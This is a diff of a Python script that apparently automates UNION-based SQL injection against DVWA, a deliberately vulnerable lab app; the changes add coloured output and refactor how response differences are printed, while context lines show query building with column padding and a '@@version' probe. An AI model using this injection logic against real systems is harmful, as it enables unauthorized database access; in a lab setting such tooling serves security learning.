@@ -10,6 +10,12 @@ REQUEST_TYPES = set(["get", "post"])
 token = os.environ.get('TOKEN')
 cookies = {'PHPSESSID': token, "security": "low"}
 
+class Style():
+	RED = "\x1b[31m"
+	GREEN = "\x1b[32m"
+	CYAN = "\x1b[96m"
+	RESET = "\033[0m"
+
 def error_exit(msg):
 	print(f"Error: {msg}")
 	exit(1)
@@ -28,15 +34,23 @@ def form_url(url, add):
 	baseurl = baseurl_match.group()
 	return baseurl + '/' + add
 
-def print_diff(str1, str2):
+def get_diff(str1, str2):
 	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
+	ret = ""
 	cnt = 0
 	for d in diff:
 		cnt = cnt + 1
 		if cnt < 4:
 			continue
-		print(d)
-	print(diff)
+		ret = ret + d
+	return ret
+
+def print_result(str1, str2, query):
+	diff = get_diff(str1, str2)
+	result = re.sub('<.*?>', '\n', diff)
+	result = result.replace(query, "[query]")
+	print(result)
+	return result
 
 class Union:
 	def __init__(self, submit):
@@ -64,9 +78,9 @@ class Union:
 		colum_lst = [colum_name] * self.colum_counts
 		colums = ", ".join(colum_lst)
 		query = self.header + "SELECT " + colums + contents + self.comment
-		print(f"QUERY: {query}")
+		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
 		res = self.submit(query)
-		print_diff(self.original_text, res.text)
+		print_result(self.original_text, res.text, query)
 
 	def get_version(self):
 		self.exec_union("@@version", "")
